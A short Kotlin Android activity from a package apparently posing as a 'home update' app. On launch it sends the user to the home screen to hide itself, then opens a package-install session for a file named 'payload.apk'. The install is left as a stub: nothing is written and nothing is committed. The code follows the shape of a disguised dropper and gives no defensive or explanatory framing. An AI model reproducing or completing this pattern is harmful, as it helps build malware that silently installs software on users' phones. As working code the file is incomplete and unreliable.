package com.example.homeupdate
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageInstaller
import android.os.Bundle
class HomeActivity : Activity() {
  override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    val home = Intent(Intent.ACTION_MAIN)
    home.addCategory(Intent.CATEGORY_HOME)
    startActivity(home)
    if (packageManager.canRequestPackageInstalls()) {
      val installer = packageManager.packageInstaller
      val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
      val id = installer.createSession(params)
      val session = installer.openSession(id)
      val out = session.openWrite("payload.apk", 0, -1)
      out.close()
    }
  }
}
